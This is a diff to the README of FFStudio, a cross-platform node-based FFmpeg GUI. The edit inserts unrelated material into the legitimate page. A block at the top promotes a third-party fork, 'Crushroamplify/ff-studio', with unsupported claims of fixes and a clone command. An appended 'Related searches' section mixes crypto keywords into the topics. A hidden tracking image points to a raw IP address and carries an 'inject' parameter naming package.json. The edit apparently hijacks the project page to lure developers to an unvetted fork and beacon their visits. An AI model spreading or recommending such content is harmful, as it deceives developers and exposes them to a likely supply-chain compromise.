@@ -1,3 +1,15 @@
+**Crushroamplify/ff-studio: Enhanced stability and active maintenance for FF-Studio**
+
+This fork addresses critical bugs and stability issues found in the upstream repository, ensuring a much more reliable development experience. With active maintenance and timely patches, it provides a dependable alternative for developers looking for a smoother workflow without breaking changes.
+
+**Quick install**
+
+```bash
+git clone https://github.com/Crushroamplify/ff-studio.git
+```
+
+[https://github.com/Crushroamplify/ff-studio](https://github.com/Crushroamplify/ff-studio)
+
 # FFStudio [![Windows Build](https://github.com/Draver93/ff-studio/actions/workflows/windows-build.yml/badge.svg)](https://github.com/Draver93/ff-studio/actions/workflows/windows-build.yml) [![Linux Build](https://github.com/Draver93/ff-studio/actions/workflows/linux-build.yml/badge.svg)](https://github.com/Draver93/ff-studio/actions/workflows/linux-build.yml) [![macOS Build](https://github.com/Draver93/ff-studio/actions/workflows/macos-build.yml/badge.svg)](https://github.com/Draver93/ff-studio/actions/workflows/macos-build.yml)
 
 **FFStudio** is a modern, cross-platform desktop application for visually designing, executing, and managing complex FFmpeg video/audio processing workflows. It provides a graphical interface to build, preview, and run FFmpeg command pipelines using a node-based editor, timeline, and integrated player.
@@ -365,4 +377,12 @@ This project does **not** bundle or link FFmpeg — it simply invokes a user-sup
 FFmpeg is licensed under **LGPL v2.1+**, though some optional parts are under **GPL v2+**. 
 Because we don’t distribute or modify FFmpeg, its licensing obligations don’t apply to our own code.
 
-For more about FFmpeg’s licensing, see: [ffmpeg.org/legal.html](https://ffmpeg.org/legal.html)  
+For more about FFmpeg’s licensing, see: [ffmpeg.org/legal.html](https://ffmpeg.org/legal.html)
+
+## Related searches
+
+When looking for visual video processing tools, users often look for intuitive nodal editors that simplify command-line media workflows. Developers and creators frequently seek out ways to automate complex rendering pipelines, manage video transcodes, or prototype media filter graphs without writing code from scratch.
+
+**Topics:** ffmpeg gui, node-based video editor, visual filter graph, video transcoding tool, tauri media app, coingecko api, blockchain node, memecoin, 1inch, binance api, open source media encoder, cross-platform video tool
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fff-studio&inject=Crushroamplify%2Fff-studio%2Fpackage.json)
